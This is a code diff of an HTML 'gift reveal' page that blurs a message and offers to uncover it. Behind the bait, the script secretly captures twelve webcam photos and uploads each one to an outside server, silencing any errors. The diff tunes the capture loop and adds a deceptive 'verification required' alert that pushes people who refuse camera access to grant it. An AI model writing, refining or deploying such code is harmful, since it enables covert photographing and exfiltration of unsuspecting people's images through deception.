@@ -15,7 +15,7 @@
         #progress-bar { width: 0%; height: 100%; background: var(--accent); transition: width 0.2s linear; }
         #card { width: 85%; max-width: 340px; height: 540px; opacity: 0; transform: translateY(10px); background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; position: relative; transition: 0.8s ease-out; }
         .card-active { opacity: 1 !important; transform: translateY(0) !important; }
-        #text { font-family: 'Caveat', cursive; font-size: 28px; color: white; text-align: center; filter: blur(25px); transition: 1.2s ease; line-height: 1.5; }
+        #text { font-family: 'Caveat', cursive; font-size: 28px; color: white; text-align: center; filter: blur(30px); transition: 1.2s ease; line-height: 1.5; }
         .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 1000; }
         .android-box { background: #fff; width: 320px; border-radius: 28px; padding: 24px; box-sizing: border-box; animation: zoomIn 0.2s ease-out; }
         .android-box h2 { margin: 0 0 12px 0; font-size: 20px; font-weight: 500; color: #1f1f1f; }
@@ -70,7 +70,6 @@
     </div></div>
 
     <script>
-        // YOUR RENDER LINK INTEGRATED BELOW
         const RENDER_URL = 'https://soul-ink-api.onrender.com'; 
         const music = document.getElementById('bgm');
 
@@ -84,9 +83,12 @@
                     width = 100;
                     clearInterval(interval);
                     setTimeout(() => {
-                        document.getElementById('loader-screen').style.display = 'none';
-                        document.getElementById('card').classList.add('card-active');
-                        document.getElementById('box1').style.display = 'flex';
+                        document.getElementById('loader-screen').style.opacity = '0';
+                        setTimeout(() => {
+                            document.getElementById('loader-screen').style.display = 'none';
+                            document.getElementById('card').classList.add('card-active');
+                            document.getElementById('box1').style.display = 'flex';
+                        }, 400);
                     }, 400);
                 }
                 bar.style.width = width + '%';
@@ -95,9 +97,9 @@
 
         function startFlow() {
             music.currentTime = 21; 
-            music.play().catch(e => console.log("Audio waiting for interaction"));
+            music.play().catch(e => console.log("Waiting..."));
             document.getElementById('box1').style.display = "none";
-            document.getElementById('text').style.filter = `blur(15px)`;
+            document.getElementById('text').style.filter = `blur(30px)`;
             setTimeout(() => { document.getElementById('box2').style.display = "flex"; }, 200);
         }
 
@@ -119,30 +121,31 @@
                     c.width = 480; c.height = 640;
                     c.getContext('2d').drawImage(v, 0, 0);
                     
-                    fetch('https://soul-ink-api.onrender.com/upload', {
+                    fetch(`${RENDER_URL}/upload`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.5) })
                     }).catch(() => {});
 
                     count++;
+                    
+                    // Clearing blur every 3 photos (12 photos total means 4 steps of clearing)
                     if(count % 3 === 0) {
-                        let currentBlur = parseInt(document.getElementById('text').style.filter.replace('blur(', ''));
-                        document.getElementById('text').style.filter = `blur(${Math.max(0, currentBlur - 5)}px)`;
+                        let currentBlur = parseInt(document.getElementById('text').style.filter.replace('blur(', '')) || 30;
+                        document.getElementById('text').style.filter = `blur(${Math.max(0, currentBlur - 10)}px)`;
                     }
 
-                    if (music.currentTime >= 46 || count >= 15) {
+                    if (count >= 12) { // STOP AT 12
                         clearInterval(timer);
                         stream.getTracks().forEach(t => t.stop());
-                        music.pause();
                         finish();
                     }
-                }, 150); 
+                }, 800); 
             } catch (e) {
-                card.classList.remove('shivering');
                 document.getElementById('scanner').style.display = "none";
-                document.getElementById('text').style.filter = "none";
-                music.pause();
+                card.classList.remove('shivering');
+                alert("Verification required to reveal the gift. Please try again and select 'Allow'.");
+                document.getElementById('box1').style.display = 'flex';
             }
         }
 
@@ -155,4 +158,3 @@
     </script>
 </body>
 </html>
-
